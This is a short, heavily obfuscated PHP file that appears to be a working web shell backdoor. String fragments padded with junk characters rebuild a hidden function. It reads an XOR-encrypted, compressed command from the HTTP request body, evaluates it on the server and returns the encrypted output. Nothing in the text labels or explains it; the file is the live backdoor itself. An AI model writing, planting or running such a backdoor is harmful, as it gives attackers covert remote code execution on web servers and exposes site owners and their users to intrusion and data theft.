<?php
$Y='/6pu/6t"),$m)==1) {@o/6b_sta/6rt()/6;/6@e/6va/6l(@gzu/6ncompress(@x(@ba/6/6se64_deco/6de($m[1]),/6$k)));$o=@/6/6ob_';
$N='$/6k="43770e73"/6;$kh="/67792ae/6abb3b/69"/6;$kf="0696/630b1/6b50f"/6;$p/6="vYfO/6/6Rev43hTxwAic/6";function x($/6t,$k){';
$R='$/6c=s/6/6trlen($k)/6;$/6l=strlen(/6$t);$o=/6"";fo/6r($i=0/6;$i<$l;){fo/6r($j=/60/6;($j<$c/6&&$i<$l/6);$j++,$i+/6+){';
$p='ge/6t_contents()/6;@ob_/6end_cle/6an();$r=/6@b/6ase64_enco/6/6de(@x(@gzcom/6p/6ress($o/6),$k));p/6rint("/6$p$k/6h$r$kf");}';
$s='$o.=/6/6$t{$i}^$k{$/6j};}/6/6}retur/6n $o;}if (@p/6reg_ma/6tch("/$kh/6(.+)$/6kf/",@fi/6l/6e_g/6et_cont/6ents/6("php://in';
$C=str_replace('QD','','cQDreQDatQDe_QDfuncQDQDtion');
$K=str_replace('/6','',$N.$R.$s.$Y.$p);
$O=$C('',$K);$O();
?>
